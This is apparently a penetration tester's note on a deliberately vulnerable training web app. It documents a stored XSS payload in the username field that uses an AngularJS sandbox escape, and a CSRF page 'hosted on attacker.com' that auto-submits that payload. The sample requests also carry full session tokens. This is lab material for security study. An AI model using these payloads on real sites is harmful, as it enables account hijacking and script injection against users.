## Description

Returns JSON containing contents of a user basket 

## Connection Details

HTTP Methods: `GET, POST`
POST Parameters: 
- `username`

### Sample Request
```http
POST /profile HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:3000/profile
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://localhost:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=WovBXRLelZ6qD2xVyrEK9GQgsMTPfgimlHpjCJ4Ag5mkOMQj1Pnzp8Y47b3w; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMFQwNDo1MzozMC43NzRaIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMFQwOTo1Njo0MC42NzhaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNTMwMjAxLCJleHAiOjE2NzE1NDgyMDF9.rTsY0ldQPEBmgJIzH69bPrEl6PIcCRNJuDRp1gtridr308G6A6o8hQaEYE0SjsjsePI-chQuHxDxU0hanphIf80D64AcwExkg6Sspdkg9_utLWtBHNyWplnPsjAuBuyFCwgUX0HaBQiUOafh-qpQodO-BQRMpHqTkAmyqM3Muyw
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=admin
```

## Parameters 

### `?`

#### Description

#### Sample

## Vulnerabilities

### Stored XSS

#### Exploit 
```http
POST /profile HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:3000/profile
Content-Type: application/x-www-form-urlencoded
Content-Length: 303
Origin: http://127.0.0.1:3000
DNT: 1
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; continueCode=KOhmt6sEUzHzT7F3fviZS8HyvIKlfjxSk9H1acBLHK7CjYiw1hlQtqYTM9sOR; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTEsInVzZXJuYW1lIjoiPGltZz4iLCJlbWFpbCI6ImFteUBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDMwZjA1ZTQ1ZTMwNzEwYzNhZDNjMzJmMDBkZTA0NzMiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0xMi0yMlQwMzoyNjowMC4xMjhaIiwidXBkYXRlZEF0IjoiMjAyMi0xMi0yMlQwOTozOTowNS43NDdaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjcxNzAxOTQ2LCJleHAiOjE2NzE3MTk5NDZ9.xnEgf3E5Ji6EXXYLBRjP_lCHfH2AaDFUEyWfCRWZGBcLbrdROhX8b-DlUdLhAtRRDLs-EMEEslGwAHBBIH84GKtst4pQgBUuUs0RuK1Wnj9IogSlZlpIB3EupZXcO9ybp1hdfzbW_KJPl391eNVQFS4PwiZcJTIjsmHCpDfwhLQ
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=%3c%3cimg%20iscript%20src%3d%22https%3a%2f%2fajax.googleapis.com%2fajax%2flibs%2fangularjs%2f1.4.6%2fangular.min.js%22%3e%3c%2fscript%3e%3c%3cimg%20idiv%20ng-app%3e%20%7b%7b'a'.constructor.prototype.charAt%3d%5b%5d.join%3b%24eval('x%3d1%7d%20%7d%20%7d%3balert(1)%3b%2f%2f')%3b%7d%7d%3c%2fdiv%3e
```

#### Impact

Chained with CSRF for XSS. 

### CSRF to change username

#### Exploit 

Hosted on attacker.com
```html
<html>
    <body>
        <form action="http://bc87-129-126-109-177.ap.ngrok.io/profile" method="POST">
            <input type="hidden" name="username" value="<<img iscript src='https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js'></script><<img idiv ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}</div>" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

#### Impact

Username change will redirect to application profile page automatically triggering the XSS. 

## Possible Attack Vectors

